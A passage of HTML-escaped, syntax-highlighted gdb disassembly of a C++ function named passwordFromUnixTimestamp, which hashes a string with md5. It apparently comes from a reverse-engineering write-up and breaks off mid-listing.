+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401023 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;111&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lea    &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x30&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdx
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401027 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;115&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lea    &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x000000000040102b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;119&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdx&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rsi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x000000000040102e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;122&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401031 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;125&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: callq  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x400d70 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;_ZNSsC1ERKSs@plt&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401036 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;130&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x1a8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x000000000040103d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;137&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lea    &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdx
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401041 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;141&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdx&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rsi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401044 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;144&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401047 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;147&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: callq  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x402581 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;_z3md5ss&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x000000000040104c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;152&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lea    &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401050 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;156&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401053 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;159&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: callq  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x400dc0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;_ZNSsD1Ev@plt&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401058 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;164&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lea    &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x30&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x000000000040105c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;168&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x000000000040105f &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;171&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: callq  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x400dc0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;_ZNSsD1Ev@plt&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401064 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;176&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lea    &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x1a0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x000000000040106b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;183&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdi
+&lt;&#x2F;span&gt;&lt;span&gt;---&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;Type &amp;lt;return&amp;gt; to continue&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;or &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;q &amp;lt;return&amp;gt; to quit&lt;&#x2F;span&gt;&lt;span&gt;---
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x000000000040106e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;186&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: callq  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x400e70 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;_ZNSt18basic_stringstreamIcSt11char_traitsIcESaIcEED1Ev@plt&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401073 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;191&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x1a8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x000000000040107a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;198&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;add    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x1a8&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rsp
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401081 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;205&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;pop    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbx
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401082 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;206&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;pop    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401083 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;207&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: retq   
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401084 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;208&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbx
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401087 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;211&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lea    &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x000000000040108b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;215&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x000000000040108e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;218&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: callq  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x400dc0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;_ZNSsD1Ev@plt&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401093 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;223&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;jmp    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x401098 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;_Z25passwordFromUnixTimestampl&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span 